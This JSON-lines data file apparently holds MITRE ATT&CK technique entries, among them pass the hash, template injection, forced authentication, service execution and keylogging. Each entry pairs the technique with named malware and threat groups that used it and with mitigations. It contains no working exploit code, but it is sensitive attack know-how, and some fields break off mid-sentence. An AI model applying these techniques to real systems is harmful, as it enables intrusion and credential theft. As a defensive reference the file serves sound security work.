{"text": " **This technique has been deprecated and should no longer be used.** As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary’s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.", "idx": "https://attack.mitre.org/techniques/T1149", "title": "LC_MAIN Hijacking", "entity": "LC_MAIN Hijacking", "entity_type": "techniques", "entity_context": ["Enforce valid digital signatures for signed code on all applications and only trust applications with signatures from trusted parties."], "is_subtechnique": false}
{"text": " Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)", "idx": "https://attack.mitre.org/techniques/T1550/002", "title": "Pass the Hash", "entity": "Pass the Hash", "entity_type": "techniques", "entity_context": ["Pass-The-Hash Toolkit can perform pass the hash.", "Cobalt Strike can perform pass the hash.", "The APT1 group is known to have used pass the hash.", "GALLIUM used dumped hashes to authenticate to other machines via pass the hash.", "Empire can perform pass the hash attacks.", "Chimera has dumped password hashes for use in pass the hash authentication attacks.", "Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems.", "APT32 has used pass the hash for lateral movement.", "Enable pass the hash mitigations to apply UAC restrictions to local accounts on network logon. The associated Registry key is located <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code>.\n\nThrough GPO: Computer Configuration > Policies > Administrative Templates > SCM: Pass the Hash Mitigations: Apply UAC restrictions to local accounts on network logons.", "PoshC2 has a number of modules that leverage pass the hash for lateral movement.", "Kimsuky has used pass the hash for authentication to remote access software used in C2.", "APT28 has used pass the hash for lateral movement.", "CrackMapExec can pass the hash to authenticate via SMB.", "Do not allow a domain user to be in the local administrator group on multiple systems.", "HOPLIGHT has been observed loading several APIs associated with Pass the Hash.\t", "Night Dragon used pass-the-hash tools to gain usernames and passwords.", "Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. ", "Mimikatz's <code>SEKURLSA::Pth</code> module can impersonate a user, with only a password hash, to execute arbitrary commands."], "is_subtechnique": true}
{"text": " Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file. Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime. To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection. The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image. To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system. This method typically requires administrative level access to the device. In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device", "idx": "https://attack.mitre.org/techniques/T1601/001", "title": "Patch System Image", "entity": "Patch System Image", "entity_type": "techniques", "entity_context": ["Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.", "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines. ", "SYNful Knock is malware that is inserted into a network device by patching the operating system image.", "Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image. ", "Refer to NIST guidelines when creating password policies.  ", "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations. ", "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."], "is_subtechnique": true}
{"text": " Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices. Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)", "idx": "https://attack.mitre.org/techniques/T1602", "title": "Data from Configuration Repository", "entity": "Data from Configuration Repository", "entity_type": "techniques", "entity_context": ["Keep system images and software updated and migrate to SNMPv3.", "Segregate SNMP traffic on a separate management network.", "Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources.", "Apply extended ACLs to block unauthorized protocols outside the trusted network.", "Configure SNMPv3 to use the highest level of security (authPriv) available.", "Allowlist MIB objects and implement SNMP views."], "is_subtechnique": false}
{"text": " Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039). [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution. Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.", "idx": "https://attack.mitre.org/techniques/T1569/002", "title": "Service Execution", "entity": "Service Execution", "entity_type": "techniques", "entity_context": ["FIN6 has created Windows services to execute encoded PowerShell commands.", "Honeybee launches a DLL file that gets executed as a service using svchost.exe", "Microsoft Sysinternals PsExec is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.", "Net Crawler uses PsExec to perform remote service manipulation to execute a copy of itself as part of lateral movement.", "Impacket contains various modules emulating other service execution tools such as PsExec.", "Proxysvc registers itself as a service on the victim’s machine to run as a standalone process.", "The <code>net start</code> and <code>net stop</code> commands can be used in Net to execute or stop Windows services.", "Koadic can run a command on another machine using PsExec.", "LoudMiner started the cryptomining virtual machine as a service on the infected machine.", "Operation Wocao has created services on remote systems for execution purposes.", "Pupy uses PsExec to execute a payload or commands on a remote host.", "Empire can use PsExec to execute a payload on a remote host.", "APT38 has created new services or modified existing ones to run executables, commands, or scripts.", "On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by PsExec from running. ", "gh0st RAT can execute its service if the Service key exists. If the key does not exist, gh0st RAT will create and run the service.", "BBSRAT can start, stop, or delete services.", "PoshC2 contains an implementation of PsExec for remote execution.", "SLOTHFULMEDIA has the capability to start services.", "Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services.", "HOPLIGHT has used svchost.exe to execute a malicious DLL .", "APT32's backdoor has used Windows services as a way to execute its malicious payload. ", "StrongPity can install a service to execute itself as a service.", "Bad Rabbit drops a file named <code>infpub.dat</code>into the Windows directory and is executed through SCManager and <code>rundll.exe</code>.", "APT39 has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.", "Anchor can create and execute services to load its payload.", "Winexe installs a service on the remote system, executes the command, then uninstalls the service.", "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.", "Blue Mockingbird has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service.\t", "xCmd can be used to execute binaries on remote systems by creating and starting a service.", "Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level.", "APT41 used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.", "Ragnar Locker has used sc.exe to execute a service that it creates.", "Attor's dispatcher can be executed as a service.", "RemoteCMD can execute commands remotely by creating a new service on the remote system.", "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.", "Okrum's loader can create a new service named NtmsSvc to execute the payload.", "Ke3chang has used a tool known as RemoteExec (similar to PsExec) to remotely execute batch scripts and binaries.", "NotPetya can use PsExec to help propagate itself across a network.", "InvisiMole has used Windows services as a way to execute its malicious payload.", "HyperBro has the ability to start and stop a specified service.", "Olympic Destroyer utilizes PsExec to help propagate itself across a network.", "Hydraq uses svchost.exe to execute a malicious DLL included in a new service group.", "Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim network.", "WastedLocker can execute itself as a service.", "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.", "Pysa has used PsExec to copy and execute the ransomware.", "Shamoon creates a new service named “ntssrv” to execute the payload. Shamoon can also spread via PsExec.", "Chimera has used PsExec to deploy beacons on compromised systems.", "Silence has used Winexe to install a service on the remote system."], "is_subtechnique": true}
{"text": " Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region. Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).", "idx": "https://attack.mitre.org/techniques/T1596/004", "title": "CDNs", "entity": "CDNs", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments. [PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)", "idx": "https://attack.mitre.org/techniques/T1546/013", "title": "PowerShell Profile", "entity": "PowerShell Profile", "entity_type": "techniques", "entity_context": ["Turla has used PowerShell profiles to maintain persistence on an infected machine.", "Making PowerShell profiles immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence.", "Enforce execution of only signed PowerShell scripts. Sign profiles to avoid them from being modified.", "Avoid PowerShell profiles if not needed. Use the -No Profile flag with when executing PowerShell scripts remotely to prevent local profiles and scripts from being executed."], "is_subtechnique": true}
{"text": " Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017) Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded. Adversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017) This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)", "idx": "https://attack.mitre.org/techniques/T1221", "title": "Template Injection", "entity": "Template Injection", "entity_type": "techniques", "entity_context": ["Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.", "Inception has used decoy documents to load malicious remote payloads via HTTP.", "Consider disabling Microsoft Office macros/active content to prevent the execution of malicious payloads in documents , though this setting may not mitigate the Forced Authentication use for this technique.", "Gamaredon Group has used DOCX files to download malicious DOT document templates. Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.", "Network/Host intrusion prevention systems, antivirus, and detonation chambers can be employed to prevent documents from fetching and/or executing malicious payloads.", "Train users to identify social engineering techniques and spearphishing emails.", "Frankenstein has used trojanized documents that retrieve remote templates from an adversary-controlled website.", "Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload. ", "DarkHydrus used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable Forced Authentication.", "Tropic Trooper delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.", "APT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. "], "is_subtechnique": false}
{"text": " An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information. Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.", "idx": "https://attack.mitre.org/techniques/T1123", "title": "Audio Capture", "entity": "Audio Capture", "entity_type": "techniques", "entity_context": ["Imminent Monitor has a remote microphone monitoring capability.", "Bandook has modules that are capable of capturing audio.", "TajMahal has the ability to capture VoiceIP application audio on an infected host.", "EvilGrab has the capability to capture audio from a victim machine.", "APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input.", "Flame can record audio using any existing hardware recording devices.", "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to <code>%APPDATA%\\Intel\\Skype</code>.", "DarkComet can listen in to victims' conversations through the system’s microphone.", "PowerSploit's <code>Get-MicrophoneAudio</code> Exfiltration module can record system microphone audio.", "DOGCALL can capture microphone data from the victim's machine.", "Cobian RAT has a feature to perform voice recording on the victim’s machine.", "Crimson can perform audio surveillance using microphones.", "Machete captures audio from the computer’s microphone.", "InvisiMole can record sound using input audio devices.", "Janicab captured audio and sent it out to a C2 server.", "Cadelspy has the ability to record audio from the compromised host.", "Attor's has a plugin that is capable of recording audio using available input sound devices.", "Revenge RAT has a plugin for microphone interception.", "VERMIN can perform audio capture.", "Remcos can capture data from the system’s microphone.", "Derusbi is capable of performing audio captures.", "Micropsia can perform microphone recording.", "NanoCore can capture audio feeds from the system.", "ROKRAT has a audio capture and eavesdropping module.", "jRAT can capture microphone recordings.", "MacSpy can record the sounds from microphones on a computer.", "Pupy can record sound with the microphone."], "is_subtechnique": false}
{"text": " Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted). Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)", "idx": "https://attack.mitre.org/techniques/T1505/001", "title": "SQL Stored Procedures", "entity": "SQL Stored Procedures", "entity_type": "techniques", "entity_context": ["Stuxnet used xp_cmdshell to store and execute SQL code.", "Sandworm Team has used various MS-SQL stored procedures. \n", "Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made. ", "Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. ", "Ensure all application component binaries are signed by the correct application developers. "], "is_subtechnique": true}
{"text": " An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)", "idx": "https://attack.mitre.org/techniques/T1560/003", "title": "Archive via Custom Method", "entity": "Archive via Custom Method", "entity_type": "techniques", "entity_context": ["StrongPity can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.", "InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration.", "OopsIE compresses collected files with a simple character replacement scheme before sending them to its C2 server.", "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.", "NETWIRE has used a custom encryption algorithm to encrypt collected data.", "Attor encrypts collected data with a custom implementation of Blowfish and RSA ciphers.", "Agent.btz saves system information into an XML file that is then XOR-encoded.", "ADVSTORESHELL compresses output data generated by command execution with a custom implementation of the Lempel–Ziv–Welch (LZW) algorithm.", "FLASHFLOOD employs the same encoding scheme as SPACESHIP for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.", "RGDoor encrypts files with XOR before sending them back to the C2 server.", "A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.", "Stuxnet encrypts exfiltrated data via C2 with static 31-byte long XOR keys.", "Reaver encrypts collected data with an incremental XOR key prior to exfiltration.", "Data SPACESHIP copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.", "OSX_OCEANLOTUS.D scrambles and encrypts data using AES256 before sending it to the C2 server.", "FrameworkPOS can XOR credit card information before exfiltration.", "Okrum has used a custom implementation of AES encryption to encrypt collected data.", "Ramsay can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.", "MESSAGETAP has XOR-encrypted and stored contents of SMS messages that matched its target list. ", "OwaAuth DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.", "FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.", "RawPOS encodes credit card data it collected from the victim with XOR.", "HAWKBALL has encrypted data with XOR before sending it over the C2 channel.", "Mustang Panda has encrypted documents with RC4 prior to exfiltration.", "Rising Sun can archive data using RC4 encryption and Base64 encoding prior to exfiltration.\t", "CopyKittens encrypts data with a substitute cipher prior to exfiltration.", "BLUELIGHT has encoded data into a binary blob using XOR.", "T9000 encrypts collected data using a single byte XOR key.", "Kimsuky has used RC4 encryption before exfil.", "Machete's collected data is encrypted with AES before exfiltration. "], "is_subtechnique": true}
{"text": " Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)", "idx": "https://attack.mitre.org/techniques/T1027/001", "title": "Binary Padding", "entity": "Binary Padding", "entity_type": "techniques", "entity_context": ["FinFisher contains junk code in its functions in an effort to confuse disassembly programs.", "Moafee has been known to employ binary padding.", "CORESHELL contains unused machine instructions in a likely attempt to hinder analysis.", "BRONZE BUTLER downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.", "POWERSTATS has used useless code blocks to counter analysis.", "CostaBricks has added the entire unobfuscated code of the legitimate open source application Blink to its code.", "Higaisa performed padding with null bytes before calculating its hash.", "Mustang Panda has used junk code within their DLL files to hinder analysis.", "Maze has inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.", "Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.", "Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection.", "APT32 includes garbage code to mislead anti-malware software and researchers.", "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.", "APT29 has used large file sizes to avoid detection.", "A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.", "Gamaredon Group has obfuscated .NET executables by inserting junk code.\t", "Rifdoor has added four additional bytes of data upon launching, then saved the changed version as <code>C:\\ProgramData\\Initech\\Initech.exe</code>.", "A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.", "yty contains junk code in its binary, likely to confuse malware analysts.", "Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.", "ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions.", "Grandoreiro has added BMP images to the resources section of its Portable Executable (PE) file increasing each binary to at least 300MB in size.", "SamSam has used garbage code to pad some of its malware components.", "Javali can use large obfuscated libraries to hinder detection and analysis.", "QakBot can use large file sizes to evade detection.", "TAINTEDSCRIBE can execute <code>FileRecvWriteRand</code> to append random bytes to the end of a file received from C2.", "FatDuke has been packed with junk code and strings.", "WastedLocker contains junk code to increase its entropy and hide the actual code.", "Goopy has had null characters padded in its malicious DLL payload.", "GrimAgent has the ability to add bytes to change the file hash."], "is_subtechnique": true}
{"text": " Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept. The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security) Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation:", "idx": "https://attack.mitre.org/techniques/T1187", "title": "Forced Authentication", "entity": "Forced Authentication", "entity_type": "techniques", "entity_context": ["Use strong passwords to increase the difficulty of credential hashes from being cracked if they are obtained.", "Dragonfly 2.0 has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.", "\nBlock SMB traffic from exiting an enterprise network with egress filtering or by blocking TCP ports 139, 445 and UDP port 137. Filter or block WebDAV protocol traffic from exiting the network. If access to external resources over SMB and WebDAV is necessary, then traffic should be tightly limited with allowlisting.  ", "DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.", "EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure."], "is_subtechnique": false}
{"text": " Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "idx": "https://attack.mitre.org/techniques/T1102/003", "title": "One-Way Communication", "entity": "One-Way Communication", "entity_type": "techniques", "entity_context": ["Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.", "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services.", "OnionDuke uses Twitter as a backup C2.", "Metamorfo has downloaded a zip file for execution on the system. ", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "The \"tDiscoverer\" variant of HAMMERTOSS establishes a C2 channel by downloading resources from Web services like Twitter and GitHub. HAMMERTOSS binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.", "EVILNUM has used a one-way communication method via GitLab and Digital Point to perform C2."], "is_subtechnique": true}
{"text": " Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include: * Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data. * Reading raw keystroke data from the hardware buffer. * Windows Registry modifications. * Custom drivers. * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)", "idx": "https://attack.mitre.org/techniques/T1056/001", "title": "Keylogging", "entity": "Keylogging", "entity_type": "techniques", "entity_context": ["NanoCore can perform keylogging on the victim’s machine.", "Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.", "PoisonIvy contains a keylogger.", "When it first starts, BADNEWS spawns a new thread to log keystrokes.", "Unknown Logger is capable of recording keystrokes.", "Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system.", "APT38 used a Trojan called KEYLIME to capture keystrokes from the victim’s machine.", "Cadelspy has the ability to log keystrokes on the compromised host.", "AppleSeed can use <code>GetKeyState</code> and <code>GetKeyboardState</code> to capture keystrokes on the victim’s machine. ", "menuPass has used key loggers to steal usernames and passwords.", "QuasarRAT has a built-in keylogger.", "Micropsia has keylogging capabilities.", "SLOTHFULMEDIA has a keylogging capability.", "APT41 used a keylogger called GEARSHIFT on a target system.", "DOGCALL is capable of logging keystrokes.", "SMOKEDHAM can continuously capture keystrokes.", "BabyShark has a PowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger.", "DustySky contains a keylogger.", "Magic Hound malware is capable of keylogging.", "Machete logs keystrokes from the victim’s machine.", "FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger.", "NETWIRE can perform keylogging.", "Pupy uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.", "InvisiMole can capture keystrokes on a compromised host.", "PowerSploit's <code>Get-Keystrokes</code> Exfiltration module can log keystrokes.", "OilRig has used keylogging tools called KEYPUNCH and LONGWATCH.\t\n", "Lokibot has the ability to capture input on the compromised host via keylogging.", "Sykipot contains keylogging functionality to steal passwords.", "BlackEnergy has run a keylogger plug-in on a victim.", "RunningRAT captures keystrokes and sends them back to the C2 server.", "Carbanak logs key strokes for configured processes and sends them back to the C2 server.", "BadPatch has a keylogging capability.", "Astaroth logs keystrokes from the victim's machine. ", "ThiefQuest uses the <code>CGEventTap</code> functions to perform keylogging.", "JPIN contains a custom keylogger.", "KGH_SPY can perform keylogging by polling the <code>GetAsyncKeyState()</code> function.", "APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes.", "yty uses a keylogger plugin to gather keystrokes.", "SslMM creates a new thread implementing a keylogging facility using Windows Keyboard 